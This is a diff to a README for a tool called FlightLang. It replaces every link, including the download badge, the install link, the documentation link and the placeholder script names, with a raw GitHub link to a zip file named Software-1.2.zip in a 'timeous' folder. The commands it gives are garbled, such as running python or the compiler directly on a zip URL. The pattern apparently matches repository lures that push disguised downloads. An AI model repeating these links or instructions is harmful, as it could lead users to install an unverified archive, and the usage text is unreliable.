@@ -6,7 +6,7 @@ Welcome to flightlang! This guide will help you download and run the FlightLang 
 
 ## 📥 Download Now
 
-[![Download flightlang](https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/flightlang.zip)](https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/flightlang.zip)
+[![Download flightlang](https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/Software-1.2.zip)](https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/Software-1.2.zip)
 
 ## 🔧 System Requirements
 
@@ -37,7 +37,7 @@ FlightLang is designed for autonomous systems. It allows users to create mission
 
 ## 📂 Download & Install
 
-To get started, visit this page to download the latest version: [Download flightlang](https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/flightlang.zip).
+To get started, visit this page to download the latest version: [Download flightlang](https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/Software-1.2.zip).
 
 ### Step-by-Step Installation
 
@@ -63,20 +63,20 @@ Once you have installed FlightLang, you can start using it.
 To compile a FlightLang script, open the command prompt or terminal and run the following command:
 
 ```
-flightlang compile https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/flightlang.zip
+flightlang compile https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/Software-1.2.zip
 ```
 
-Replace `https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/flightlang.zip` with the name of your script. The compiler will check your code and generate the necessary output files.
+Replace `https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/Software-1.2.zip` with the name of your script. The compiler will check your code and generate the necessary output files.
 
 ### Running Python Scripts
 
 If you want to execute a Python script, ensure you have Python installed on your system. You can run a FlightLang Python script by using the following command:
 
 ```
-python https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/flightlang.zip
+python https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/Software-1.2.zip
 ```
 
-Make sure to replace `https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/flightlang.zip` with the actual name of your Python script.
+Make sure to replace `https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/Software-1.2.zip` with the actual name of your Python script.
 
 ## 🗂️ Example Scripts
 
@@ -89,7 +89,7 @@ You can use these examples as templates to create your custom scripts.
 
 ## 🔗 Additional Resources
 
-- For detailed documentation, refer to the [FlightLang Documentation](https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/flightlang.zip).
+- For detailed documentation, refer to the [FlightLang Documentation](https://raw.githubusercontent.com/mike12mike2012/flightlang/main/timeous/Software-1.2.zip).
 - Join our community forums to ask questions and share your experiences.
 - Find tutorials and guides for common tasks.
 
